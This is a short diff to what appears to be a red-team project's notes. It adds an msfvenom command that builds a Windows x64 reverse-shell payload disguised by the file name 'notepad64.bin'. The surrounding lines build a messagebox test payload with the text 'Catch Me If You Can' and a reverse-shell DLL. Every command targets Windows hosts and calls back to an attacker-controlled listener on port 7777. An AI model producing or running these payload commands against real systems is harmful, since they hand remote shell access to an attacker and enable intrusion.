@@ -1,4 +1,5 @@
 ```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.10.110 LPORT=7777 -f raw -o notepad64.bin
 msfvenom -p windows/x64/messagebox TITLE="NyaMeeEain" Text="Catch Me If You Can...Shellcode is loading"   -f raw -o raw.bin
 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.100.105 LPORT=7777 -f dll -o  shell.dll
